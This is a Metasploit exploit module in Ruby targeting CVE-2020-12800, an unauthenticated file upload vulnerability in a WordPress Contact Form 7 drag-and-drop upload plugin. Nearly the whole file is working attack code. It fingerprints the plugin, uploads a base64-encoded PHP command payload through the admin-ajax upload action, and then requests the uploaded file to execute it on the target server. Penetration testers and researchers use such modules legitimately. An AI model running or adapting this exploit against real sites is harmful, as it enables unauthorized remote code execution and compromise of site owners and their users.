##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Drag and Drop Multiple File Upload for Contact Form 7 Unauthenticated File Upload',
        'Description' => %q{
          This module exploits an unauthenticated file upload vulnerability in the
          Drag and Drop Multiple File Upload for Contact Form 7 plugin before 1.3.3.3
          for WordPress. Due to the plugin not properly checking the file being uploaded
          (via the dnd_codedropz_upload AJAX action), an attacker could bypass the checks
          in place and upload a PHP file.  Contact Form 7 must also be installed.
        },
        'Author' => [
          'Austin Martin', # Vulnerability discovery
          'yournamehere'   # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-12800'],
          ['EDB', '48520'],
          ['URL', 'https://github.com/amartinsec/CVE-2020-12800']
        ],
        'Payload' => {
          'Space' => 8192, # Adjusted for likely longer file paths
          'DisableNops' => true,
          'Compat' => {
            'PayloadType' => 'cmd cmd_unix',
            'RequiredCmd' => 'generic'
          }
        },
        'Platform' => ['unix', 'linux'],
        'Arch' => ARCH_CMD,
        'Targets' => [
          ['Automatic', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2020-05-26'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the WordPress application', '/']),
        OptString.new('PLUGIN_PATH', [true, 'Path to the plugin directory', 'wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/']),
        OptString.new('URIPATH', [false, 'The path to access the uploaded file', nil])
      ]
    )
  end

  def check
    uri = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'])
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => uri
    )

    unless res
      vprint_error('Connection failed')
      return CheckCode::Unknown
    end

    if res.code == 200 && res.body.include?('drag-and-drop-multiple-file-upload-contact-form-7.php')
      CheckCode::Vulnerable
    else
      CheckCode::Safe
    end
  end

  def exploit
    php_payload = Rex::Text.encode_base64("<?php #{payload.encoded} ?>")
    filename = "#{Rex::Text.rand_text_alpha(8)}.php"

    print_status("Uploading payload: #{filename}")

    post_data = {
      'action' => 'dnd_codedropz_upload',
      'file' => "data:application/x-php;base64,#{php_payload}",
      'name' => filename
    }

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin-ajax.php'),
      'vars_post' => post_data
    )

    if res && res.code == 200 && res.body.include?('success')
      print_good("File successfully uploaded")

      # If URIPATH is set use it, otherwise try to guess it
      if datastore['URIPATH']
        file_uri = normalize_uri(target_uri.path, datastore['URIPATH'], filename)
      else
        file_uri = normalize_uri(target_uri.path, 'wp-content/uploads/', filename)
      end

      print_status("Attempting to execute the payload at #{file_uri}")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => file_uri
      )

      if res
        print_status("The server returned: #{res.code}")
      else
        print_error("Failed to execute the payload.  Please check your settings.")
      end
    else
      print_error("File upload failed")
      fail_with(Failure::UnexpectedReply, 'File upload failed. Check your settings or target may be patched.')
    end
  end
end